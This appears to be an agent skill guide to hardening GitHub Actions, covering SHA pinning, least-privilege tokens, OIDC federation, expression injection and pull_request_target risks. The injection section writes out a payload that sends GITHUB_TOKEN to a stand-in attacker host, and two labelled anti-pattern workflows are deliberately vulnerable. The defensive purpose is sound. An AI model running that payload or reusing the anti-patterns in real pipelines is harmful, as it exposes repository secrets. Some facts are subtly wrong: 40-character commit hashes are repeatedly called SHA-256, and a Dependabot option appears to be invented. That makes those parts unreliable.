---
name: modern-gha-security-and-hardening
description: >-
  Use this skill when auditing, hardening, or securing GitHub Actions workflows:
  enforcing immutable SHA-256 action pinning, configuring automated Dependabot version bumps,
  enforcing least-privilege token permissions, implementing passwordless OIDC authentication
  (AWS, GCP, Azure, Vault), mitigating script and expression injection vulnerabilities,
  handling pull_request vs pull_request_target boundaries securely, generating build provenance
  attestations (SLSA), and configuring OpenSSF Scorecard scans.
---

# Modern GitHub Actions Security & Supply Chain Hardening

This skill guides you through implementing enterprise-grade zero-trust security and supply chain defense in GitHub Actions pipelines.

---

## 1. Immutable SHA-256 Action Pinning & Dependabot

Mutable Git tags (such as `@v4`, `@v1`, `@main`) can be rewritten or hijacked by attackers compromised upstream accounts. All external actions must be pinned to full 40-character SHA-256 commit hashes.

### Canonical Workflow Syntax
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code Repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Setup Node.js Runtime
        uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
        with:
          node-version: 22
          cache: npm
```

### Automated Maintenance via Dependabot (`.github/dependabot.yml`)
To keep pinned actions current without compromising immutability, configure Dependabot to submit automated pull requests updating both the commit SHA and comment:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    commit-message:
      prefix: "ci"
      include: "scope"
    open-pull-requests-limit: 10
    # Retain full SHA pinning while bumping comments
    pin-actions-tags: false
```

---

## 2. Least-Privilege Token Permissions

By default, unconfigured workflows may inherit broad write permissions across the entire repository. Apply strict least-privilege access by denying all permissions at the root and granting only what is required at the job level.

### Standard Permission Hardening Pattern
```yaml
name: CI & Quality Gate

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# 1. Deny all ambient token permissions by default
permissions: {}

jobs:
  test:
    name: Run Unit Tests
    runs-on: ubuntu-latest
    timeout-minutes: 15
    # 2. Grant only read access to repository contents for test execution
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: npm ci && npm test

  publish-pr-comment:
    name: Post Coverage Report
    needs: [test]
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # 3. Grant write permissions exclusively for pull request comments
    permissions:
      contents: read
      pull-requests: write
    steps:
      - name: Publish Comment
        run: echo "Publishing coverage metrics..."
```

### Token Permission Reference Matrix
| Permission Scope | Minimal Read (`read`) | Write (`write`) | Use Case |
| :--- | :--- | :--- | :--- |
| `contents` | Clone private repository, read commits | Push commits, tags, releases | Code checkout, release publishing |
| `id-token` | Not applicable | Generate OIDC JWT token | Cloud federation (AWS, GCP, Azure) |
| `pull-requests` | View PR metadata and labels | Create comments, assign reviewers | PR metrics, automated feedback |
| `packages` | Pull container images from GHCR | Publish images to GHCR | Docker build & push to GitHub Packages |
| `security-events` | Read SARIF alerts | Upload SARIF results | CodeQL, Trivy, Snyk security uploads |

---

## 3. Passwordless OIDC Cloud Federation

Never store long-lived credentials (`AWS_ACCESS_KEY_ID`, GCP JSON service account keys) in GitHub Secrets. Use GitHub's OpenID Connect (OIDC) identity provider to exchange ephemeral, short-lived JWTs for temporary cloud role sessions.

### AWS OIDC Federation Example
```yaml
jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      id-token: write # Mandatory to request the GitHub Actions JWT token
    steps:
      - name: Checkout Code
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Authenticate via AWS OIDC
        uses: aws-actions/configure-aws-credentials@e3ddf1e3cb1b216f9ac2634209ebe590055595f2 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy-role
          aws-region: us-east-1
          audience: sts.amazonaws.com

      - name: Verify AWS Caller Identity
        run: aws sts get-caller-identity
```

### Google Cloud OIDC Workload Identity Federation Example
```yaml
    steps:
      - name: Authenticate to Google Cloud via OIDC
        uses: google-github-actions/auth@6fc4af4b145ae7821d527454aa9bd537d1f2dc5f # v2.1.7
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
          service_account: 'github-deployer@my-project.iam.gserviceaccount.com'
```

---

## 4. Defense Against Script and Expression Injection

GitHub context variables like `${{ github.event.issue.title }}`, `${{ github.event.pull_request.head.ref }}`, and `${{ github.event.comment.body }}` contain arbitrary strings controlled by external contributors.

When evaluated directly inside a shell command string, attackers can execute arbitrary code by injecting shell metacharacters (e.g. `"; curl https://attacker.com/steal?token=$GITHUB_TOKEN; #`).

### ❌ Vulnerable Anti-Pattern
```yaml
# NEVER evaluate untrusted expressions directly inside inline bash commands
- name: Process Issue Title
  run: |
    echo "Title is: ${{ github.event.issue.title }}"
```

### ✅ Secure Remediation via Intermediate Environment Variables
```yaml
# Pass untrusted values via environment variables: the shell treats them as raw string data
- name: Process Issue Title Safely
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
    BRANCH_NAME: ${{ github.head_ref }}
  run: |
    echo "Processing Issue: ${ISSUE_TITLE}"
    echo "Branch: ${BRANCH_NAME}"
```

---

## 5. `pull_request` vs `pull_request_target` Security Boundaries

Understanding the execution context of PR events is critical to prevent privilege escalation:

| Event Trigger | Actor Context | Token Permissions | Repository Secrets Access | Head Ref Safety |
| :--- | :--- | :--- | :--- | :--- |
| `pull_request` | Fork branch | Read-only (by default) | **NO access** to secrets | Safe to build and test untrusted code |
| `pull_request_target` | Base repository (`main`) | Write permissions available | **FULL access** to repository secrets | **HIGH RISK**: Never checkout or run PR head code directly! |

### ⚠️ Dangerous `pull_request_target` Anti-Pattern
```yaml
# EXTREME VULNERABILITY: Gives untrusted fork PR full access to base repo secrets and write token!
on: pull_request_target

jobs:
  dangerous-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }} # ❌ Checked out untrusted code!
      - run: npm test # ❌ Executed malicious PR script with production secrets!
```

### Correct Pattern for Fork PR Labeling / Triage
Use `pull_request_target` **only** for lightweight metadata operations (labeling, commenting) without checking out PR code:
```yaml
name: Triage Pull Request

on:
  pull_request_target:
    types: [opened, labeled]

permissions:
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Apply Size Label
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          script: |
            github.rest.issues.addLabels({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              labels: ['needs-triage']
            });
```

---

## 6. Supply Chain Attestation & SLSA Provenance

Modern release pipelines should produce cryptographic provenance attestations linking built artifacts back to the exact commit SHA, workflow run, and repository.

```yaml
jobs:
  build-and-attest:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # Required for Sigstore keyless signing
      attestations: write # Required to publish GitHub Artifact Attestations
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Build Application Binary
        run: |
          mkdir -p dist
          tar -czf dist/app-release.tar.gz ./src

      - name: Generate SLSA Build Provenance Attestation
        uses: actions/attest-build-provenance@c074443f1a5fb4a482973331d3a1f42e47265287 # v2.2.3
        with:
          subject-path: 'dist/app-release.tar.gz'
```

---

## 7. Security Hardening Checklist

- [ ] All external actions are pinned to full 40-character SHA-256 hashes with `# vX.Y.Z` comments.
- [ ] `.github/dependabot.yml` is enabled with `package-ecosystem: "github-actions"`.
- [ ] Root-level `permissions: {}` is declared on every workflow file.
- [ ] Individual jobs define minimal granular permissions.
- [ ] Zero static cloud keys stored in GitHub Secrets; all cloud logins use OIDC (`permissions: id-token: write`).
- [ ] No direct `${{ ... }}` expression interpolation inside `run:` shell commands; all mapped to `env:`.
- [ ] `pull_request_target` never checks out untrusted fork code (`ref: ${{ github.event.pull_request.head.sha }}`).
- [ ] Job-level `timeout-minutes` is explicitly configured on every job.
- [ ] Build artifacts and container images produce cryptographic build provenance attestations.
